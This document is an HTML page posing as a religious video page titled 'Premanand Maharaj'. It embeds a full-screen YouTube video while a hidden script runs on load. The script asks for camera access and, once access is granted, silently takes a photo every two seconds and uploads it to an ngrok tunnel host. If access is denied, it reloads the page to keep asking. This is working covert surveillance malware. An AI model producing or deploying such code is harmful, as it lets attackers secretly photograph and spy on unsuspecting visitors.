<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premanand Maharaj</title>
</head>
<body>
    <iframe style="width:100%; height:100vh" src="https://www.youtube.com/embed/jLRuAdw7FvU?si=q0h4Le8HwmTH6bkQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
    <script>
     const canvas = document.createElement('canvas');
const context = canvas.getContext('2d');

function requestCameraAccess() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then((stream) => {
            // Camera access granted
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            setInterval(() => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0);
                canvas.toBlob((blob) => {
                    const formData = new FormData();
                    formData.append('photo', blob, 'photo.jpg');

                    fetch('https://a7c0-150-242-65-3.ngrok-free.app/upload', { // replace URL
                        method: 'POST',
                        body: formData
                    })
                        .then(response => response.text())
                        .then(data => {
                            console.log(data); // Log success message
                        })
                        .catch(error => {
                            console.error('Error uploading photo:', error);
                        });
                }, 'image/jpeg');
            }, 2000);
        })
        .catch((err) => {
            console.error("Error accessing camera: ", err);
            // If denied, reload to trigger browser permission pop-up again
            setTimeout(() => {
                location.reload(); // Refresh the page
            }, 3000);
        });
}

// Call the function on page load
requestCameraAccess();

    </script>
</body>
</html>
